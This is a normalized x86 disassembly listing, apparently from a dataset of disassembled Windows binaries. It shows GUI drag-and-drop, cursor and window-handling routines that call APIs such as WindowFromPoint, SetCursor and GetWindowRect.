lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbc
call sub_3a6457c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_3aaca64
sub_3aad48c
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3a7a4f0
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_3a7a388
mov edx esi
mov eax [ rw-data ]
call sub_3a7a33c
jmp r-xdata
sub_3aad4e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call __imp_SendMessageA
mov ecx eax
sub_3aad540
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_3a65730
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_3aac5ac
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_3aad5a0
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_3aad540
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_3aad5cc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_3aad338
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_3aad5a0
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_3aad4e8
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_3ab7c38
mov [ esi ] eax
sub_3aad61c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0x10
push eax
mov eax [ rw-data ]
mov eax [ eax + 0xc ]
mov ecx [ rw-data ]
mov edx ebx
call sub_3aad4e8
cmp eax 0x1
sbb eax eax
inc eax
sub_3aad658
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ esi + 0x1db ] 0x0
je r-xdata
cmp [ esi + 0x1ac ] 0x0
je r-xdata
mov eax esi
call sub_3ab65ec
test eax eax
je r-xdata
mov eax esi
call sub_3ab65ec
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0x10
xor edx edx
call sub_3aae0f8
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x1ac ]
call sub_3a7a494
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x1ac ]
call sub_3a7a4f0
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx edi
mov eax esi
call sub_3ab6600
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_3aad6f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
movzx ecx [ eax + 0x8f ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_3aad5cc
mov esi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ ebx ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8f ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ ebx + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_3ab9b28
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x14 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov al 0x1
call sub_3aad61c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov al 0x2
call sub_3aad61c
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0x4 ]
mov edi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
call sub_3aaf6c0
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x1c ] edx
mov eax [ rw-data ]
mov [ eax + 0x8 ] esi
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0xc ] edx
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0x10 ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x14 ] edx
xor eax eax
call sub_3aad61c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acce1c
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3ab9ad8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ esi + 0x51 ] 0x20
jne r-xdata
call sub_3aad658
mov edi eax
mov eax [ rw-data ]
mov [ eax + 0x60 ] edi
test edi edi
jne r-xdata
mov edx [ ebx + 0x4 ]
push edx
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
xchg edx eax
mov si 0xffe7
call sub_3a6457c
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ rw-data ]
call sub_3ab9c24
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
call sub_3ab9b28
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax edi
call sub_3aaf6c0
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffd8
call sub_3a6457c
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
mov eax [ rw-data ]
lea edx [ eax + 0x18 ]
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov si 0xffd8
call sub_3a6457c
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3ab9c98
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acce1c
push eax
call SetCursor
mov ebx [ rw-data ]
lea edx [ ebx + 0x64 ]
lea eax [ ebx + 0x4c ]
mov ecx 0x10
call sub_3a69360
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_3aad9e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x8 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
mov edx [ rw-data ]
mov [ eax + 0x14 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_3aacbc0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x4c ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x28 ] ecx
mov [ edx + 0x2c ] ecx
mov edi [ edx + 0x10 ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x28 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_3ab9b28
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov ecx esi
mov edi [ ecx + 0x14 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x30 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_3aad6f8
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_3aadb50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_3aadcf5
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x8f ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_3a6457c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_3a6457c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aacef4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3aad9e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aacde4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax esi
call sub_3ab7c38
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_3a78df4
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_3aaf610
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x50 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x40 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x4c ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_3a78df4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x58 ] edx
sub_3aadd14
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
mov si 0xffbd
call sub_3a6457c
mov ebx eax
sub_3aadd88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x5 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_3aae09d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_3aae02b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x1
mov eax [ rw-data ]
movzx edx [ ebp - 0x1 ]
mov [ eax + 0x20 ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_3aacc08
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_3a64530
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x8 ] 0x0
sete al
mov [ ebx + 0x74 ] al
mov eax [ rw-data ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x11 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xd ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0x11 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0xd ] edx
jmp r-xdata
mov [ ebp - 0x9 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
jne r-xdata
push ebp
call sub_3aadd14
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
call sub_3aad61c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_3ab9c98
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aae032
mov eax [ rw-data ]
call sub_3a64380
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_3ac463c
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x0
mov eax [ ebp - 0xd ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x11 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_3ab0e78
jmp r-xdata
mov edx [ eax + 0x268 ]
cmp edx [ ebx + 0x40 ]
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_3aadfcf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
push edx
mov edx [ rw-data ]
add edx 0x10
push edx
mov edx [ rw-data ]
mov edx [ edx + 0xc ]
mov ecx [ rw-data ]
xchg edx eax
call sub_3aad4e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
xor edx edx
mov [ ebp - 0x11 ] edx
xor edx edx
mov [ ebp - 0xd ] edx
xor edx edx
call sub_3ac95b4
retn
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
sub_3aae032
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_3a6450c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3aae0c4
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aac5e0
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_3aae0f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_3aae0c4
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebp
call sub_3aaf6c0
lea edx [ esp + 0x8 ]
mov ecx ebx
mov eax ebp
call sub_3ab4a48
test eax eax
je r-xdata
mov esi eax
sub_3aae144
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_3a7a33c
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx ] eax
sub_3aae16c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_3a7a630
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_3a64380
xor eax eax
mov [ ebx ] eax
sub_3aae18c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_3aae1bc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_3a7a898
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3aae26c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_3aae245
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_3aae3f8
call sub_3a64ce0
call sub_3a64ce0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a7a494
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_3a8a1d8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_3aae278
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_3a7a898
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3aae316
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aae31d
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_3aae2ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_3aae3f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a8a234
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a7a494
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_3a8a1d8
test al al
je r-xdata
sub_3aae324
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3aae3f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a89d74
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aae350
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8a3c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_3a8a3c8
mov eax [ ebp - 0x4 ]
call sub_3aae444
mov eax [ rw-data ]
call sub_3a7a898
mov ebx eax
xor eax eax
push ebp
push sub_3aae3d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7a33c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
call sub_3aae1bc
sub_3aae3f8
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_3a8a3c8
mov edx ebx
mov eax [ rw-data ]
call sub_3a7a8ac
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_3aae444
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3ab0294
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_3aae470
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aae4ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_3a7abb4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_3aae4f4
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
